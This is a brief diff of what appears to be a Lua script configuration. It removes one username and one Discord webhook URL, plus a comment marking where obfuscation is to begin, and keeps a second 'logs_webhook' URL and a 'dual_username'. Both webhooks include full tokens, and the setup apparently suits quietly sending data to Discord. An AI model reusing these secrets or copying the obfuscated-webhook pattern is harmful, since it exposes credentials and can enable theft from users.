@@ -1,7 +1,3 @@
-local username = "antbish"
-local webhook = "https://discord.com/api/webhooks/1339162252183343188/naBYzSxeckt0ZNkaPGLaQUrgiO1fFHdWspN2ksinOzJvRMBhuShAdh-aXreP5db2pbl7"
-
---obfuscate from here
 local logs_webhook = "https://discord.com/api/webhooks/1383473069372473484/VdGRMaHGf8dcAxD8BnjVEWL4NciWVVzu5yqg17ViuSwlxOVn5JToJSmWU5uAoJP5eCWB"
 
 local dual_username = "hatchmempire"
